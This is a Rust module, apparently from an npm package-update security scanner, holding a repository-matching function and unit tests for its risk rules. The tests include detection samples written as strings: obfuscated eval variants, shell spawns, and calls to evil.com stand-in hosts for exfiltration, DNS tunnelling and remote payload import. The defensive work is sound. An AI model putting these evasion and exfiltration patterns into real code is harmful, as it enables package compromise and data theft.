/// Check if a provenance repository matches an allowed repository pattern on path boundaries.
pub fn is_repo_allowed(provenance_repo: &str, allowed_pattern: &str) -> bool {
    let norm_repo = normalize_repo_uri(provenance_repo);
    let norm_pattern = normalize_repo_uri(allowed_pattern);

    if norm_repo.eq_ignore_ascii_case(norm_pattern) {
        return true;
    }

    if let Some(stripped) = norm_repo.strip_suffix(norm_pattern)
        && (stripped.ends_with('/') || stripped.ends_with(':'))
    {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::diff::FileChange;

    #[test]
    fn blocks_on_lifecycle_scripts() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 5,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec!["postinstall".into()],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(verdict.risk_score >= 50);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R01_LIFECYCLE_SCRIPT_ADDED")
        );
    }

    #[test]
    fn flags_suspicious_eval_and_binaries() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.1.0".into(),
            files_added: vec![FileChange {
                relative_path: "index.js".into(),
                kind: FileKind::Text,
                lines_added: 2,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: Some("+const x = eval(payload);\n".into()),
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 2,
            total_lines_deleted: 0,
            new_executables: vec!["payload.node".into()],
            new_binaries: vec!["payload.node".into()],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R03_EVAL_USAGE")
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R02_EXECUTABLE_ADDED")
        );
    }

    #[test]
    fn flags_opaque_large_file_added() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![FileChange {
                relative_path: "large.bin".into(),
                kind: FileKind::OpaqueTooLarge,
                lines_added: 0,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec!["large.bin".into()],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R02_OPAQUE_LARGE_FILE_ADDED")
        );
    }

    #[test]
    fn blocks_on_binding_gyp_addition() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![FileChange {
                relative_path: "binding.gyp".into(),
                kind: FileKind::Text,
                lines_added: 5,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 5,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: true,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R01_BINDING_GYP_ADDED")
        );
    }

    #[test]
    fn detects_obfuscated_eval_and_multiline() {
        assert!(is_eval_invocation(r#"\x65val(payload)"#));
        assert!(is_eval_invocation(r#"\u0065val(payload)"#));
        assert!(is_eval_invocation("eval\n(payload)"));
        assert!(is_eval_invocation("window['\\x65val'](x)"));
        assert!(is_eval_invocation("(() => {}).constructor('return 1')()"));
        assert!(is_eval_invocation(
            "Reflect.construct(Function, ['code'])()"
        ));
    }

    #[test]
    fn detects_child_proc_variants() {
        assert!(is_child_proc_invocation("execSync('whoami')"));
        assert!(is_child_proc_invocation("spawnSync('ls')"));
        assert!(is_child_proc_invocation("execFileSync('sh')"));
        assert!(is_child_proc_invocation("child_process\n.execSync(cmd)"));
        assert!(is_child_proc_invocation(
            "process.getBuiltinModule('child_process')"
        ));
    }

    #[test]
    fn detects_non_semver_urls_in_dependencies() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![("malicious-pkg".into(), "ssh://git@host/repo".into())],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R04_DEPENDENCY_ADDED" && f.severity == VerdictBand::High)
        );
    }

    #[test]
    fn first_sighting_elevated_to_medium() {
        let delta = Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![FileChange {
                relative_path: "index.js".into(),
                kind: FileKind::Text,
                lines_added: 1,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 1,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::Medium);
        assert_eq!(verdict.risk_score, 15);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R06_FIRST_SIGHTING" && f.severity == VerdictBand::Medium)
        );
    }

    #[test]
    fn flags_unreviewed_predecessor_baseline() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, true);
        assert_eq!(verdict.band, VerdictBand::Medium);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R07_UNREVIEWED_PREDECESSOR_BASELINE")
        );
    }

    #[test]
    fn detects_octal_and_comment_obfuscations() {
        assert!(is_eval_invocation(r#"\145\166\141\154(payload)"#));
        assert!(is_eval_invocation("eval/*comment*/(payload)"));
        assert!(is_eval_invocation("new/**/Function(payload)"));
        assert!(is_eval_invocation("eval`payload`"));
        assert!(is_eval_invocation("Function('return this')()"));
    }

    #[test]
    fn detects_eval_after_inline_url() {
        assert!(is_eval_invocation(
            r#"const url = "http://evil.com"; eval(payload);"#
        ));
        assert!(is_eval_invocation(
            r#"const url = 'https://evil.com'; eval(payload);"#
        ));
        assert!(is_eval_invocation(
            "const url = `//comment-like`; eval(payload);"
        ));
    }

    #[test]
    fn detects_vm_and_network_primitives() {
        assert!(is_vm_invocation("vm.runInThisContext(code)"));
        assert!(is_vm_invocation("const script = new vm.Script(code)"));
        assert!(is_network_invocation("fetch('https://evil.com/exfil')"));
        assert!(is_network_invocation("http.request('http://evil.com', cb)"));
    }

    #[test]
    fn detects_modified_binaries() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![FileChange {
                relative_path: "binding.node".into(),
                kind: FileKind::Binary,
                lines_added: 0,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec!["binding.node".into()],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R02_BINARY_BLOB_MODIFIED")
        );
    }

    #[test]
    fn detects_modified_dependency_non_semver_url() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![(
                "cookie".into(),
                "0.7.1".into(),
                "https://evil.com/cookie.tgz".into(),
            )],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R04_DEPENDENCY_MODIFIED")
        );
    }

    #[test]
    fn detects_base64_variants_and_child_proc_bindings() {
        assert!(is_base64_decode("Buffer.from(x, 'base64url')"));
        assert!(is_base64_decode("Buffer.from(x, \"BASE64\")"));
        assert!(is_base64_decode("Buffer.from(x, 'hex')"));
        assert!(is_child_proc_invocation("process.binding('spawn_sync')"));
        assert!(is_child_proc_invocation(
            "process._linkedBinding('spawn_sync')"
        ));
    }

    #[test]
    fn escalates_to_block_on_high_accumulated_score() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.1.0".into(),
            files_added: vec![
                FileChange {
                    relative_path: "p1.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
                FileChange {
                    relative_path: "p2.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
                FileChange {
                    relative_path: "p3.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
                FileChange {
                    relative_path: "p4.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
            ],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![
                "p1.exe".into(),
                "p2.exe".into(),
                "p3.exe".into(),
                "p4.exe".into(),
            ],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate("test-pkg", "verified (sha512)", &delta, false);
        assert_eq!(verdict.risk_score, 100);
        assert_eq!(verdict.band, VerdictBand::Block);
    }

    #[test]
    fn policy_blocks_blacklisted_package() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy.blocklist.packages.push("blocked-*".into());

        let verdict =
            evaluate_with_policy("blocked-pkg", "verified (sha512)", &delta, false, &policy);
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P01_PACKAGE_BLOCKED")
        );
    }

    #[test]
    fn policy_allows_whitelisted_lifecycle_script() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec!["postinstall".into()],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy
            .allowlist
            .packages
            .push(crate::policy::PackageAllowRule {
                name: "esbuild".into(),
                allowed_scripts: vec!["postinstall".into()],
                max_risk: None,
                integrity: None,
            });

        let verdict = evaluate_with_policy("esbuild", "verified (sha512)", &delta, false, &policy);
        assert_eq!(verdict.band, VerdictBand::Low);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P02_LIFECYCLE_SCRIPT_ALLOWED")
        );
    }

    #[test]
    fn detects_indirect_eval_and_optional_chaining() {
        assert!(is_eval_invocation("(0, eval)('malicious')"));
        assert!(is_eval_invocation("(eval)('malicious')"));
        assert!(is_eval_invocation("eval?.('malicious')"));
        assert!(is_eval_invocation("window?.eval?.('malicious')"));
        assert!(is_eval_invocation("eval.call(null, 'malicious')"));
        assert!(is_vm_invocation("vm.compileFunction('code')"));
        assert!(is_base64_decode("atob?.('payload')"));
        assert!(is_child_proc_invocation("cp?.spawn('sh')"));
    }

    #[test]
    fn blocks_on_malware_advisory() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let adv = AdvisoryReport {
            status: crate::advisory::AdvisoryStatus::Vulnerable,
            hits: vec![crate::advisory::AdvisoryItem {
                id: "MAL-2026-9999".into(),
                summary: "Credential stealer in package".into(),
                details: "".into(),
                aliases: vec![],
                severity: VerdictBand::Block,
                cvss_score: None,
                is_malware: true,
            }],
            source: "osv.dev".into(),
            message: None,
        };

        let verdict = evaluate_with_trust(
            "pkg",
            "verified (sha512)",
            &delta,
            false,
            &Policy::default(),
            Some(&adv),
            None,
        );

        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R09_ADVISORY_MALWARE")
        );
    }

    #[test]
    fn blocks_on_critical_cve_advisory() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let adv = AdvisoryReport {
            status: crate::advisory::AdvisoryStatus::Vulnerable,
            hits: vec![crate::advisory::AdvisoryItem {
                id: "GHSA-xxxx".into(),
                summary: "Remote code execution".into(),
                details: "".into(),
                aliases: vec!["CVE-2026-1111".into()],
                severity: VerdictBand::Block,
                cvss_score: Some(9.8),
                is_malware: false,
            }],
            source: "osv.dev".into(),
            message: None,
        };

        let verdict = evaluate_with_trust(
            "pkg",
            "verified (sha512)",
            &delta,
            false,
            &Policy::default(),
            Some(&adv),
            None,
        );

        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R09_ADVISORY_CRITICAL_CVE")
        );
    }

    #[test]
    fn blocks_on_provenance_digest_mismatch() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let prov = ProvenanceReport::failed_mismatch("digest hash mismatch");

        let verdict = evaluate_with_trust(
            "pkg",
            "verified (sha512)",
            &delta,
            false,
            &Policy::default(),
            None,
            Some(&prov),
        );

        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_PROVENANCE_DIGEST_MISMATCH")
        );
    }

    #[test]
    fn blocks_when_required_provenance_missing_or_repo_unauthorized() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy.provenance.require_provenance = true;

        let prov_missing = ProvenanceReport::missing(false, None);
        let verdict = evaluate_with_trust(
            "pkg",
            "verified (sha512)",
            &delta,
            false,
            &policy,
            None,
            Some(&prov_missing),
        );
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_PROVENANCE_REQUIRED_MISSING")
        );

        // Test unauthorized repository
        let mut policy_repo = Policy::default();
        policy_repo
            .provenance
            .allowed_repositories
            .push("github.com/trusted-org/".into());

        let prov_untrusted_repo = ProvenanceReport {
            status: ProvenanceStatus::Verified,
            slsa_level: 3,
            builder_id: Some("https://github.com/actions/runner".into()),
            source_repo: Some("https://github.com/attacker-org/malicious".into()),
            commit_sha: Some("1234567".into()),
            workflow_path: Some(".github/workflows/release.yml".into()),
            registry_signature_present: true,
            registry_signature_key_id: None,
            message: None,
        };

        let verdict_repo = evaluate_with_trust(
            "pkg",
            "verified (sha512)",
            &delta,
            false,
            &policy_repo,
            None,
            Some(&prov_untrusted_repo),
        );
        assert_eq!(verdict_repo.band, VerdictBand::Block);
        assert!(
            verdict_repo
                .findings
                .iter()
                .any(|f| f.rule_id == "P03_UNAUTHORIZED_BUILD_REPO")
        );
    }

    #[test]
    fn enforces_repository_boundary_matching() {
        assert!(is_repo_allowed(
            "https://github.com/org/app",
            "github.com/org/app"
        ));
        assert!(is_repo_allowed(
            "git+https://github.com/org/app.git@refs/heads/main",
            "github.com/org/app"
        ));
        assert!(is_repo_allowed(
            "git+ssh://git@github.com/org/app.git",
            "org/app"
        ));
        assert!(is_repo_allowed("https://github.com/org/app", "org/app"));

        // Reject prefix / suffix / substring spoofing
        assert!(!is_repo_allowed(
            "https://github.com/org/app-malicious",
            "org/app"
        ));
        assert!(!is_repo_allowed(
            "https://github.com/attacker-org/app",
            "org/app"
        ));
        assert!(!is_repo_allowed(
            "https://github.com/attacker/org/app",
            "github.com/org/app"
        ));
    }

    #[test]
    fn detects_hardened_network_invocations() {
        assert!(is_network_invocation(
            "require('http').get('http://evil.com')"
        ));
        assert!(is_network_invocation("require('node:net').connect(1337)"));
        assert!(is_network_invocation(
            "require('http2').connect('https://evil.com')"
        ));
        assert!(is_network_invocation(
            "dns.resolveTxt('exfil.evil.com', cb)"
        ));
        assert!(is_network_invocation("import('node:https')"));
    }

    #[test]
    fn detects_hardened_eval_and_function_invocations() {
        assert!(is_eval_invocation(
            "const f = new (Function)('return process')();"
        ));
        assert!(is_eval_invocation("const run = (1, eval); run('id');"));
        assert!(is_eval_invocation("const f = AsyncFunction('return 1')"));
        assert!(is_eval_invocation("import('https://evil.com/payload.mjs')"));
        assert!(is_eval_invocation(
            "import('data:text/javascript,console.log(1)')"
        ));
        assert!(is_eval_invocation(
            "const fn = globalThis[String.fromCharCode(101, 118, 97, 108)];"
        ));
        assert!(is_eval_invocation(
            "const fn = Reflect.get(globalThis, 'eval');"
        ));
        assert!(is_eval_invocation(
            "const has = Reflect.has(globalThis, 'eval');"
        ));
        assert!(is_eval_invocation("const fn = window['eval'];"));
        assert!(is_child_proc_invocation(
            "const { Worker } = require('worker_threads');"
        ));
        assert!(is_child_proc_invocation(
            "import { Worker } from 'node:worker_threads';"
        ));
        assert!(is_child_proc_invocation(
            "const w = new Worker('code', { eval: true });"
        ));
    }

    #[test]
    fn prevents_false_positives_on_benign_identifiers() {
        assert!(!is_eval_invocation("const isFunc = isFunction(x);"));
        assert!(!is_eval_invocation("const val = timeval(s);"));
        assert!(!is_eval_invocation("const r = retrieval(key);"));
        assert!(!is_network_invocation("router.prefetch('/page');"));
        assert!(!is_network_invocation("query.refetch();"));
        assert!(!is_child_proc_invocation("const match = /test/.exec(str);"));
    }
}
